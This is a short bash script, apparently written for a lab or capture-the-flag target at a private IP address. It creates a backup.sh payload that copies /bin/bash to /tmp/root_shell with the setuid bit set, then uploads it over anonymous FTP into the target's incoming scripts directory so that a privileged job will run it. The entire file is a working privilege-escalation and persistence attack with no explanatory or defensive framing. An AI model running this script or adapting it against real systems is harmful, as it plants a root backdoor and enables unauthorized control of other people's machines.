#!/bin/bash

TARGET_IP="192.168.1.21"

if [ -z "$TARGET_IP" ]; then
    exit 1
fi

echo -e '#!/bin/bash\ncp /bin/bash /tmp/root_shell\nchmod +s /tmp/root_shell' > backup.sh

if ! command -v curl &> /dev/null; then
    sudo apt-get update && sudo apt-get install -y curl
fi

curl -s -u "anonymous:anon@lab.com" -T backup.sh ftp://${TARGET_IP}/incoming/scripts/backup.sh

rm -f backup.sh
exit 0
